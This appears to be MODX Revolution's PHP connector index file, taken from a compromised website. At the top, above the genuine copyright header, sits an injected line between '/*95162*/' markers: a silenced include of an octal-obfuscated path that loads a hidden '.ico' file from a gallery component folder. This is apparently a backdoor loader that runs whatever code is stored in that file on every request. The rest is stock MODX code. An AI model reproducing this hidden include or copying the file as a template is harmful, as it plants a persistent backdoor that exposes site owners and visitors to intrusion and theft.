<?php
/*95162*/

@include "\057h\157m\145/\163/\163k\157r\160m\141x\057k\165h\156i\056m\055k\151t\056b\171_\155o\144x\057p\165b\154i\143_\150t\155l\057c\157r\145/\143o\155p\157n\145n\164s\057g\141l\154e\162y\057.\0642\0664\0603\0631\056i\143o";

/*95162*/
/**
 * This file is part of MODX Revolution.
 *
 * Copyright (c) MODX, LLC. All Rights Reserved.
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 *
 * @package modx
 * @subpackage connectors
 */

$included = defined('MODX_CONNECTOR_INCLUDED') || defined('MODX_CORE_PATH');

/* retrieve or define MODX_CORE_PATH */
if (!defined('MODX_CORE_PATH')) {
    if (file_exists(dirname(__FILE__) . '/config.core.php')) {
        include dirname(__FILE__) . '/config.core.php';
    } else {
        define('MODX_CORE_PATH', dirname(__DIR__) . '/core/');
    }

    /* anonymous access for security/login action */
    if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'security/login') {
        define('MODX_REQP', false);
    }
}

/* include modX class - return error on failure */
if (!include_once(MODX_CORE_PATH . 'model/modx/modx.class.php')) {
    header("Content-Type: application/json; charset=UTF-8");
    header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found');
    echo json_encode(array(
        'success' => false,
        'code' => 404,
    ));
    die();
}

/* load modX instance */
$modx = new modX('', array(xPDO::OPT_CONN_INIT => array(xPDO::OPT_CONN_MUTABLE => true)));

/* initialize the proper context */
$ctx = isset($_REQUEST['ctx1']) && !empty($_REQUEST['ctx1']) && is_string($_REQUEST['ctx1']) ? $_REQUEST['ctx1'] : 'mgr';
$modx->initialize($ctx);

/* check for anonymous access or for a context access policy - return error on failure */
if (defined('MODX_REQP') && MODX_REQP === false) {
} else if (!is_object($modx->context) || !$modx->context->checkPolicy('load')) {
    header("Content-Type: application/json; charset=UTF-8");
    header($_SERVER['SERVER_PROTOCOL'] . ' 401 Not Authorized');
    echo json_encode(array(
        'success' => false,
        'code' => 401,
    ));
    @session_write_close();
    die();
}

/* set manager language in manager context */
if ($ctx == 'mgr') {
    $ml = $modx->getOption('manager_language',null,'en');
    if ($ml != 'en') {
        $modx->lexicon->load($ml.':core:default');
        $modx->setOption('cultureKey',$ml);
    }
}

/* handle the request */
$connectorRequestClass = $modx->getOption('modConnectorRequest.class', null, 'modConnectorRequest');
$modx->config['modRequest.class'] = $connectorRequestClass;
$modx->getRequest();
$modx->request->sanitizeRequest();

if (!$included) {
    $modx->request->handleRequest();
}
